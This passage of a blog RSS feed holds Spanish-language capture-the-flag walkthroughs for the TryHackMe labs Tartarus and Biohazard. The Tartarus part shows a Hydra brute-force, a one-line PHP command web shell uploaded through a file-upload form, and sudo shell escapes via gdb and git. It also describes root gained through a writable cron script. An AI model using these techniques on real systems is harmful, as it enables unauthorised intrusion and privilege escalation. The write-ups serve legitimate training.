&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Transfer complete.
&lt;span class=&#34;m&#34;&gt;14&lt;/span&gt; bytes received in 0.00 secs &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;26.3936 kB/s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
ftp&amp;gt; &lt;span class=&#34;nb&#34;&gt;pwd&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;257&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/.../...&amp;#34;&lt;/span&gt; is the current directory
ftp&amp;gt; bye
&lt;span class=&#34;m&#34;&gt;221&lt;/span&gt; Goodbye.
root@upset:~/thm/tartarus# cat test.txt 
vsftpd &lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt; file
root@upset:~/thm/tartarus# cat yougotgoodeyes.txt 
/&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
root@upset:~/thm/tartarus#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Encontramos una pagina web de apache en el puerto 80.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/tartarus/Screenshot_20200811_232106.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/tartarus# gobuster dir -u http://tartarus.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -x php,html,txt
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/robots.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/robots.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;En &lt;code&gt;robots.txt&lt;/code&gt; encontramos una direccion/pagina y un mensaje.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/tartarus/Screenshot_20200811_232720.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En la direccion que encontramos vemos dos archivos, en el primer archivo encontramos un wordlist de contraseñas en el segundo una lista de usuarios.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/tartarus/Screenshot_20200811_232811.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En el directorio que encontramos en el archivo de texto en FTP logramos ver un panel de logeo.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/tartarus/Screenshot_20200811_232943.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;hydra&#34;&gt;HYDRA&lt;/h2&gt;
&lt;p&gt;Utilizamos hydra para hacer un ataque de fuerza bruta al panel de logeo con los wordlists que encontramos. Vemos 16 posibles contraseñas para el usuario &lt;code&gt;enox&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/tartarus/Screenshot_20200811_234029.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Estas 16 posibles se muestran porque logramos encontrar el usuario pero no la contraseña, la sintaxis que utilizamos era para &lt;code&gt;Incorrect username!&lt;/code&gt; y no para &lt;code&gt;Incorrect password!&lt;/code&gt;. Volvemos a utilizar Hydra o probar la ultima contraseña.&lt;/p&gt;
&lt;p&gt;Ingresamos con las credenciales vemos que podemos subir archivos.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/tartarus/Screenshot_20200811_234545.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al subir una imagen solo nos muestra el mensaje que se ha subido mas no la direccion donde esta se encuentra.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/tartarus/Screenshot_20200811_234732.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;gobuster-1&#34;&gt;GOBUSTER&lt;/h3&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos, esta vez en el directorio nuevo.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/tartarus# gobuster dir -u http://tartarus.thm/sUp3r-s3cr3t/ -w /usr/share/wordlists/dirb/common.txt -q -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -x php,html,txt
/home.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/images &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;user---www-data&#34;&gt;USER - WWW-DATA&lt;/h2&gt;
&lt;p&gt;Encontramos la direccion &lt;code&gt;/images&lt;/code&gt; donde se encuentra otra carpeta y tambien nuestra imagen.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/tartarus/Screenshot_20200811_235132.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Agregamos una shell a un archivo php y lo subimos, ejecutamos comandos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;pre&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;cmd&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt; &lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/tartarus/Screenshot_20200811_235811.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ejecutamos una shell inversa y logramos obtener una shell con el usuario &lt;code&gt;www-data&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/tartarus/Screenshot_20200812_000001.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En el directorio de &lt;code&gt;d4rckh&lt;/code&gt; encontramos nuestra flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/tartarus/Screenshot_20200812_000440.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;user---thirtytwo&#34;&gt;USER - THIRTYTWO&lt;/h2&gt;
&lt;p&gt;Hacemos una pequeña enumeracion con &lt;code&gt;sudo -l -l&lt;/code&gt; y vemos que tenemos permisos con sudo pero con el usuario thirtytwo para ejecutar el comando &lt;code&gt;/var/www/gdb&lt;/code&gt;, utilizamos &lt;a href=&#34;https://gtfobins.github.io/gtfobins/gdb/&#34;&gt;&lt;strong&gt;gdb&lt;/strong&gt;&lt;/a&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/tartarus/Screenshot_20200812_000810.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ejecutamos el comando y logramos obtener una shell con este usario.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo -u thirtytwo /var/www/gdb -nx -ex &lt;span class=&#34;s1&#34;&gt;&amp;#39;!sh&amp;#39;&lt;/span&gt; -ex quit
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/tartarus/Screenshot_20200812_000903.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;user---d4rckh&#34;&gt;USER - d4rckh&lt;/h2&gt;
&lt;p&gt;Hacemos una pequeña enumeracion con &lt;code&gt;sudo -l -l&lt;/code&gt; y vemos que tenemos permisos con sudo pero con el usuario d4rckh para ejecutar el comando &lt;code&gt;git&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/tartarus/Screenshot_20200812_001032.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Además en la carpeta principal de thirtytwo encontramos una nota donde habla de git.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/tartarus/Screenshot_20200812_001438.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos &lt;a href=&#34;https://gtfobins.github.io/gtfobins/git/#sudo&#34;&gt;&lt;strong&gt;git&lt;/strong&gt;&lt;/a&gt;. Ejecutamos el comando y logramos obtener una shell con el usuario d4rckh.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo -u d4rckh /usr/bin/git -p &lt;span class=&#34;nb&#34;&gt;help&lt;/span&gt; config
&lt;span class=&#34;c1&#34;&gt;#!/bin/sh&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/tartarus/Screenshot_20200812_001219.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;En la carpeta principal de d4rckh encontramos un script de python que elimina todo lo que esté en &lt;code&gt;/home/cleanup/&lt;/code&gt;. Además este mismo script es ejecutado por el usuario root en un cron.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/tartarus/Screenshot_20200812_002039.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#cleanup.py&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# -*- coding: utf-8 -*-&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;os&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;sys&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;rm -r /home/cleanup/* &amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;except&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;sys&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;El script tiene permisos &lt;strong&gt;777&lt;/strong&gt; por lo que cualquiera puede leer, escribir y ejecutar. Renombramos el archivo existente y creamos uno nuevo con una shell inversa (python).&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/tartarus/Screenshot_20200812_005246.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Logramos obtener una shell con usuario root y nuestra flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/tartarus/Screenshot_20200812_005324.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/tartarus/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/tartarus/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Biohazard</title>
        <link>https://sckull.github.io/posts/biohazard/</link>
        <pubDate>Tue, 11 Aug 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Tue, 11 Aug 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/biohazard/</guid>
        <description>Biohazard es una maquina de TryHackMe aqui encontrarás la solucion para obtener las flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Biohazard es una maquina de TryHackMe aqui encontrarás la solucion para obtener las flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Biohazard&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;A CTF room based on the old-time survival horror game, Resident Evil. Can you survive until the end?&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;630&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/DesKel&#34;&gt;DesKel&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), ssh (22) y el puerto http (80) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Tue Aug 11 17:52:02 2020 as: nmap -sV -o mini_scan biohazard.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; biohazard.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.159.66&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.25s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;997&lt;/span&gt; closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.29 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
Service Info: OSs: Unix, Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Tue Aug 11 17:52:52 2020 -- 1 IP address (1 host up) scanned in 49.51 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Encontramos una pagina web en el puerto 80.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_165404.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;nightmare&#34;&gt;NIGHTMARE&lt;/h2&gt;
&lt;p&gt;Esta pagina nos lleva hacia otra &lt;code&gt;/mansionmain/&lt;/code&gt; donde encontramos otra direccion en un comentario del codigo fuente.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_165727.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En la nueva pagina encontramos un &lt;code&gt;input&lt;/code&gt; donde debemos de ingresar un &amp;ldquo;emblema&amp;rdquo;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_165809.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Tambien encontramos en el codigo fuente una cadena codificada en base64, que al decodificarla nos muestra una nueva direccion.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_165933.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En esta nueva direccion encontramos otra &lt;code&gt;/artRoom/&lt;/code&gt;, además otra pagina que contiene un &lt;code&gt;Lockpick&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_170317.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En &lt;code&gt;/artRoom/&lt;/code&gt;, vemos una nueva pagina que al visitarla encontramos la direccion o &amp;ldquo;el mapa&amp;rdquo; de la mansion.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_170528.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/diningRoom2F/&lt;/code&gt;, en esta direccion encontramos un mensaje codificado en un comentario del codigo fuente de la pagina.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_170911.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
Utilizamos &lt;a href=&#34;https://www.dcode.fr/caesar-cipher&#34;&gt;&lt;strong&gt;dcode.fr&lt;/strong&gt;&lt;/a&gt; para obtener el mensaje codificado en el que nos indican una pagina donde podemos encontrar la gema azul.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_171027.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;strong&gt;Blue Jewel&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_171133.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En &lt;code&gt;/galleryRoom/&lt;/code&gt; encontramos una nota en la que indica que los mensajes estan codificados, el primer crest contiene 18 letras decodificado y que debemos encontrar 4 crest para obtener el mensaje y la combinacion es: &lt;code&gt;crest 1 + crest 2 + crest 3 + crest 4&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_171447.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
Utilizamos &lt;a href=&#34;https://gchq.github.io/CyberChef/#&#34;&gt;&lt;strong&gt;CyberCheff&lt;/strong&gt;&lt;/a&gt; para obtener el crest 2.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_171829.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En &lt;code&gt;/barRoom/&lt;/code&gt; debemos de ingresar la falg lockpick, es la que encontramos en &lt;code&gt;/artRoom/&lt;/code&gt;, al ingresarla nos redirige a una nueva pagina donde vemos nuevamente un input y una nota musical codificada.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_172419.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;strong&gt;NOTA Musical&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_172535.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
Utilizamos &lt;a href=&#34;https://gchq.github.io/CyberChef/#&#34;&gt;&lt;strong&gt;CyberCheff&lt;/strong&gt;&lt;/a&gt; para decodificar la cadena, en donde nos muestra una nueva &amp;ldquo;flag&amp;rdquo;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_172633.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
Al ingresar la &amp;ldquo;flag&amp;rdquo; en el input que encontramos nos redirige nuevamente a otra pagina donde vemos el emblema de oro y además nos muestra la pagina donde encontramos la &amp;ldquo;flag&amp;rdquo; y que debemos de regresar a la pagina anterior (en donde pide el emblema) e ingresar la &amp;ldquo;flag&amp;rdquo;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_172812.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;strong&gt;Emblema de ORO&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_172851.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
